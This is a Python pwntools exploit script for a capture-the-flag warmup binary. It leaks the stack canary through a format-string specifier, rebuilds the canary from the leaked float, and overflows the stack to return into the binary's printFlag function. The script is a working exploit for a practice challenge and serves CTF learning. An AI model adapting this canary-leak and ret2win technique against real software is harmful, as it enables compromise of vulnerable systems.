#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './how'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# warmup challenge, didn't participate during it 
# but heard that it was quite interesting
# so tried after the warmup is done, but remote server is 
# already off by that
io = initialize()
rop = ROP(exe)

# leaking canary
io.sendlineafter(b'>', b'%10$f')
io.recvuntil(b'Hello, Agent ')
leak = io.recvline().strip().decode()
assert((leak != '0.000000') and (leak != '-0.000000'))

# converting leaked signed float to int
leak = int(leak.split(".")[0])
assert(leak > 0)
canary = struct.pack('>d', leak).hex()
canary = int(canary[:8], 16)

offset = 12
payload = flat({
    offset: [
        canary,
        0,
        0,
        0,
        elf.sym['printFlag']
    ]
})

io.sendlineafter(b'ret2win', payload)

info('leak = %s', leak)
info('canary = %#x', canary)

io.interactive()